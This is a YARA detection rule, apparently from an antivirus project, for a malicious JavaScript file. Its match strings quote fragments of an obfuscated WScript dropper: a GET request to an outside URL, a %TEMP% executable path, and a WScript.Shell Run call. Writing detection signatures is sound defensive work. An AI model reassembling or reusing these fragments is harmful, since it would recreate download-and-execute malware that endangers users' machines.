rule sig_20160328_c79f42f75aa5468816b8a9e2e1353bb7 {
  meta:
    description = "datamaliciousorder - file 20160328_c79f42f75aa5468816b8a9e2e1353bb7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "099795e3f6662a53c0c10c8c1c048a7b1a63196625fd395ea6df82e246afe4e7"

  strings:
    $s1  = "function Ekwdgavrgs() {return Wpjlyu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Skm64qQ1.exe\";};" fullword ascii
    $s2  = "do {WScript[Ghmpozlzp](Lnsuih() * 11)} while (Qasvhdfhm[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Gmwslhmf(Ejbfsjp, Lmpiocq){return Ejbfsjp - Lmpiocq;};" fullword ascii
    $s4  = "var Wpjlyu = function Qbenr() {return WScript[Zskwl](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Qasvhdfhm[Mctrlckkme](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s6  = "function Lyoku(Apvnzdz){Wpjlyu[\"Run\"](Apvnzdz, Otlhivfqx, Otlhivfqx);};" fullword ascii
    $s7  = "function Bdfpldpyk() {return ((Ffdyyzmoev == true) && (Ffdyyzmoev == Bywpjttx)) ? 1 : Otlhivfqx;};" fullword ascii
    $s8  = "function Lnsuih(){return 22;};" fullword ascii
    $s9  = "Bywpjttx = true; " fullword ascii
    $s10 = "var Cvzlxg = new this[\"Date\"]();" fullword ascii
    $s11 = "var Bywpjttx = false;" fullword ascii
    $s12 = "function Yyvaqzrjl(){return Qbndvvzjzv;};" fullword ascii
    $s13 = "var Ffdyyzmoev = false;" fullword ascii
    $s14 = " while (Yslbvtt){" fullword ascii
    $s15 = "var Wcqppxrf = false;" fullword ascii
    $s16 = "function Fbdskxypy(Whgeoykyq) {var Plcwehlbu = (1, 2, 3, 4, 5, Whgeoykyq); return Plcwehlbu;};" fullword ascii
    $s17 = "function Uukdkplfa()" fullword ascii
    $s18 = "return Gmwslhmf(Hqbtgzvrm, Dpbdyje);" fullword ascii
    $s19 = "function Cudzepn(){return Zskwl;};" fullword ascii
    $s20 = "Ffdyyzmoev = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}